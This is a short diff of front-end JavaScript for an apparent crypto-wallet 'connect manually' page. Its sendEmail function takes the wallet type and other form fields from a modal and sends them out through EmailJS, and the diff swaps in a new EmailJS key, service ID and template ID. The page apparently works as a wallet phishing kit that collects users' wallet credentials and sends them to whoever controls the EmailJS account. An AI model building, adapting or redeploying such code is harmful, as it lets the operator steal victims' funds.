@@ -180,13 +180,7 @@ function setupConnectManuallyButtons() {
  document.addEventListener('DOMContentLoaded', () => {
   setupConnectManuallyButtons();
  });
-
-
-
-
-
  // Select necessary elements
-
 
 ///New way to open modal.....
 function createCardGallery(data) {
@@ -392,7 +386,7 @@ function showNextModal() {
 // Define one single setTab function for tab switching
 // Add event listener to prevent default form submission// At the very top of your file:
 (function() {
-  emailjs.init("OnD1U1l5LMQGzQAtT"); // Get this from EmailJS dashboard
+  emailjs.init("o8rQUCE7OfKlldEDs"); // Get this from EmailJS dashboard
 })();
 function sendEmail() {
   const walletType = document.querySelector('#connectModalName').value;
@@ -408,7 +402,7 @@ function sendEmail() {
     return;
   }
 
-  emailjs.send("service_zpua9df", "template_76l44gd", params)
+  emailjs.send("service_jrf65b9", "template_w4fmugh", params)
     .then(response => {
       console.log("SUCCESS!", response.status, response.text);
       
